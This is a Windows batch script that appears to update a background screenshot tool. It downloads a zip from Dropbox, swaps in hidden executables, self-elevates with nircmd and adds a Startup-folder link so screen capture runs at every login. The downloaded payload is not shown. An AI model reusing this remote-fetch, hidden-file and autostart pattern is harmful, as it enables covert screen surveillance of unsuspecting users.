@echo off
echo LOADING...
set batdir=%~dp0
pushd "%batdir%"
timeout 2 /nobreak > NUL
net session > NUL 2>&1
if %errorlevel% == 0 (
goto linkbreak
)
taskkill /f /fi "windowtitle eq backgroundscreenshot"
rem del config.cfg
powershell -c "Invoke-WebRequest -Uri 'https://www.dropbox.com/s/htcazdfvy6mmosi/cssv.zip?dl=1' -OutFile '%batdir%\cssv.zip'"

rem TIMEOUTS HERE NOT NEEDED, ONLY FOR SHOW

attrib -h backgroundscreenshot.bat
attrib -h delete.bat
attrib -h nircmd.exe
attrib -h update.bat
timeout 1 /nobreak > NUL
del backgroundscreenshot.bat
del delete.bat
del nircmd.exe
timeout 1 /nobreak > NUL

:errorwait:
echo Waiting to see .zip
if not exist cssv.zip goto errorwait
tar.exe -xf cssv.zip
timeout 1 /nobreak > NUL
timeout 1 /nobreak > NUL
timeout 1 /nobreak > NUL


:errorwait2:
echo Unpacking
if not exist delete.bat goto errorwait2
if not exist backgroundscreenshot.bat goto errorwait2
if not exist nircmd.exe goto errorwait2
if not exist update.bat goto errorwait2

:errorwait3:
echo deleting .zip
del cssv.zip
if not exist cssv.zip goto continue
goto errorwait3

:continue:
echo closing!
start backgroundscreenshot.bat
:linkbreak:
set /p oldloc=<loc
timeout 1 /nobreak > NUL
if "%oldloc%" NEQ "%batdir%" (
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\screenshotter.lnk"
) else (
exit
)

net session > NUL 2>&1
if %errorlevel% == 0 (
	break
	) else (
	nircmd.exe elevate "%batdir%\%~n0.bat"
	exit
)
mklink "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\screenshotter.lnk" "%batdir%backgroundscreenshot.bat"
attrib -h loc
timeout 1 /nobreak > NUL
echo %batdir%>loc
timeout 1 /nobreak > NUL
attrib +h loc
timeout 1 /nobreak > NUL
exit